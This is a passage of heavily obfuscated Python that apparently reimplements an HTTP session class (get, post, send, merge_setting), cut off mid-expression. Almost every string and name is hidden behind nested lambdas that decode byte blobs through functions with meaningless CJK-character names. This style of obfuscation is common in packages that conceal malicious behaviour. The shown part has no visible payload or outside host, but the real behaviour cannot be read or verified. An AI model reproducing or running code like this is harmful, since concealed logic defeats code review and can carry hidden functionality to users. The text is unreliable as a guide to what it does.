                send_kwargs.update({(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0f'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xff'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))()]))))())())(): self.merge_setting(verify, self.verify), (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\t'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x11'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))()]))))())())(): self.merge_setting(proxies, self.proxies), (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfa'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x06'))()]))))())())(): self.merge_setting(stream, self.stream), (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))()]))))())())(): self.merge_setting(cert, self.cert)})
                return self.send(prep, **send_kwargs)

            def get(self, url, **kwargs):
                kwargs.setdefault((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfa'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x10'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))()]))))())())(), (lambda: (lambda 搂栈聪逇蔱赣: 搂栈聪逇蔱赣 + (lambda: 趄诖狗谦頠鮳((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'))()))())((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/'))()) == (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01'))())())
                return self.request((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xe0'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xde'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xed'))()]))))())())(), url, **kwargs)

            def post(self, url, data=None, json=None, **kwargs):
                return self.request((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xe9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xe8'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xec'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xed'))()]))))())())(), url, data=data, json=json, **kwargs)

            def merge_setting(self, request_setting, session_setting, dict_class=None):
                if session_setting is None:
                    return request_setting
                if request_setting is None:
                    return session_setting
                if isinstance(session_setting, dict) and isinstance(request_setting, dict):
                    result = dict_class(session_setting) if dict_class is not None else session_setting.copy()
                    result.update(request_setting)
                    return result
                return request_setting

            def merge_hooks(self, request_hooks, session_hooks):
                merged = {}
                for key in set(session_hooks.keys()).union(request_hooks.keys()):
                    merged[key] = []
                    if key in session_hooks:
                        if isinstance(session_hooks[key], 濼颤鳴鼂錙讟):
                            merged[key].extend(session_hooks[key])
                        else:
                            merged[key].append(session_hooks[key])
                    if key in request_hooks:
                        if isinstance(request_hooks[key], 濼颤鳴鼂錙讟):
                            merged[key].extend(request_hooks[key])
                        else:
                            merged[key].append(request_hooks[key])
                return merged

            def send(self, request, **kwargs):
                kwargs.setdefault((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfa'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x06'))()]))))())())(), self.stream)
                kwargs.setdefault((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0f'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xff'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))()]))))())())(), self.verify)
                kwargs.setdefault((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))()]))))())())(), self.cert)
                kwargs.setdefault((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\t'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x11'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))()]))))())())(), self.proxies)
                if isinstance(request, 襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\n'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))()]))))())())()).models.Request):
                    raise ValueError((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf2'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfa'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xe9'))(), (lambda: 